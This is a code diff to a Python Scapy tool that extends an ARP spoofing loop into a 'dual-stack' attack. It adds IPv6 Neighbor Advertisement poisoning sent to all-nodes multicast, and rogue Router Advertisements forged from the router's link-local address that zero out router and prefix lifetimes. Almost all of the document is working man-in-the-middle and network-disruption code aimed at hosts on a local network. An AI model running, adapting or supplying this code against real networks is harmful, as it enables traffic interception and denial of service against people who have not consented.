@@ -37,8 +37,14 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
     try:
         from scapy.all import conf, Ether, ARP, sendp
         conf.sniff_promisc = False
-        from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
-        from .network import get_scapy_interface, mac_to_ipv6_ll, get_interface_ip_and_mac, resolve_mac_from_arp_cache, win_send_arp
+        from scapy.layers.inet6 import (
+            IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo,
+            ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+        )
+        from .network import (
+            get_scapy_interface, mac_to_ipv6_ll, get_interface_ip_and_mac,
+            get_interface_ipv6_prefixes, resolve_mac_from_arp_cache, win_send_arp
+        )
         npf_iface = get_scapy_interface(interface)
         src_ip, _ = get_interface_ip_and_mac(interface)
         router_ipv6_ll = mac_to_ipv6_ll(router_mac)
@@ -59,20 +65,42 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
         )
 
         # ── 2. IPv6 NDP Neighbor Advertisement (NA) Poisoning Packets ──────────────
-        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, S=1 Solicited, O=1 Override)
+        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, O=1 Override)
         pkt_na_to_target = (
             Ether(dst=target_mac, src=my_mac) /
-            IPv6(src=router_ipv6_ll, dst=target_ipv6_ll) /
-            ICMPv6ND_NA(R=1, S=1, O=1, tgt=router_ipv6_ll) /
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=my_mac)
         )
-        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, S=1 Solicited, O=1 Override)
+        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, O=1 Override)
         pkt_na_to_router = (
             Ether(dst=router_mac, src=my_mac) /
-            IPv6(src=target_ipv6_ll, dst=router_ipv6_ll) /
-            ICMPv6ND_NA(R=0, S=1, O=1, tgt=target_ipv6_ll) /
+            IPv6(src=target_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=my_mac)
         )
+
+        # ── 3. IPv6 Rogue RA Deprecation Packets ───────────────────────────────────
+        # Sourced from the router's real link-local address with routerlifetime=0
+        ra_base = (
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
+            ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
+        )
+
+        # Append Prefix Information Options for all detected local SLAAC prefixes with validlifetime=0
+        for p_str, p_len in get_interface_ipv6_prefixes(interface):
+            ra_base = ra_base / ICMPv6NDOptPrefixInfo(
+                prefix=p_str,
+                prefixlen=p_len,
+                L=1,
+                A=1,
+                validlifetime=0,
+                preferredlifetime=0
+            )
+
+        pkt_ra_unicast = Ether(dst=target_mac, src=my_mac) / ra_base
+        pkt_ra_multicast = Ether(dst="33:33:00:00:00:01", src=my_mac) / ra_base
 
         log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")
 
@@ -81,9 +109,12 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                 # Send IPv4 ARP poison
                 sendp(pkt_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_to_router, iface=npf_iface, verbose=0)
-                # Send IPv6 NDP NA poison (unicast frames to target & router)
+                # Send IPv6 NDP NA poison
                 sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
+                # Send IPv6 SLAAC/RA deprecation
+                sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
+                sendp(pkt_ra_multicast, iface=npf_iface, verbose=0)
 
                 # Realtime Self-Healing Watchdog for Host PC:
                 # If Windows host ARP cache ever accidentally maps the gateway to host's own MAC
@@ -133,15 +164,15 @@ def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac
         # Tell target: router's real MAC (IPv6)
         restore_na_target = (
             Ether(dst=target_mac, src=router_mac) /
-            IPv6(src=router_ipv6_ll, dst=target_ipv6_ll) /
-            ICMPv6ND_NA(R=1, S=1, O=1, tgt=router_ipv6_ll) /
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=router_mac)
         )
         # Tell router: target's real MAC (IPv6)
         restore_na_router = (
             Ether(dst=router_mac, src=target_mac) /
-            IPv6(src=target_ipv6_ll, dst=router_ipv6_ll) /
-            ICMPv6ND_NA(R=0, S=1, O=1, tgt=target_ipv6_ll) /
+            IPv6(src=target_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
             ICMPv6NDOptDstLLAddr(lladdr=target_mac)
         )
 
